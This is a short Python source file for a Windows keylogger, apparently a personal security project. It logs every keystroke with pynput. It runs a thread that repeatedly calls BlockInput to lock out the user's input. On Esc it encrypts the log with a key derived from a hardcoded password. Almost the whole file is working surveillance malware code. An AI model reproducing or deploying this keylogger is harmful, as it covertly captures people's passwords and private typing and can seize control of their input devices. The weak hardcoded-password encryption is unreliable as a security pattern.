from pynput import keyboard
import os
from datetime import datetime
from cryptography.fernet import Fernet
import base64
import ctypes
import threading

LOG_DIR = r"C:\Aashmit.2\Important\DEPRESSION\CODING\Cyber Security\Key Logger\Texts"
PASSWORD = "Aashmit180869420"

os.makedirs(LOG_DIR, exist_ok=True)

timestamp = datetime.now().strftime("%d %B %Y %I-%M %p")
LOG_FILE = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
ENCRYPTED_FILE = LOG_FILE + ".enc"

def generate_key(password):
    return Fernet(base64.urlsafe_b64encode(password.ljust(32).encode()[:32]))

def encrypt_file(filename, password):
    key = generate_key(password)
    
    with open(filename, "rb") as f:
        data = f.read()
    
    encrypted_data = key.encrypt(data)
    
    with open(ENCRYPTED_FILE, "wb") as f:
        f.write(encrypted_data)
    
    os.remove(filename)

def num_lock_status():
    return ctypes.windll.user32.GetKeyState(0x90) != 0

def block_input():
    while True:
        ctypes.windll.user32.BlockInput(True)

def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        try:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            elif isinstance(key, keyboard.KeyCode):
                f.write(key.char)
            elif key == keyboard.Key.shift:
                f.write("[Left Shift]")
            elif key == keyboard.Key.shift_r:
                f.write("[Right Shift]")
            elif key == keyboard.Key.ctrl:
                f.write("[Left Ctrl]")
            elif key == keyboard.Key.ctrl_r:
                f.write("[Right Ctrl]")
            elif key == keyboard.Key.alt:
                f.write("[Left Alt]")
            elif key == keyboard.Key.alt_r:
                f.write("[Right Alt]")
            else:
                f.write(f"[{key.name}]")
        except Exception:
            f.write(f"[Unknown Key]")

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        ctypes.windll.user32.BlockInput(False)
        encrypt_file(LOG_FILE, PASSWORD)
        return False

blocker_thread = threading.Thread(target=block_input, daemon=True)
blocker_thread.start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keystrokes saved and encrypted: {ENCRYPTED_FILE}")
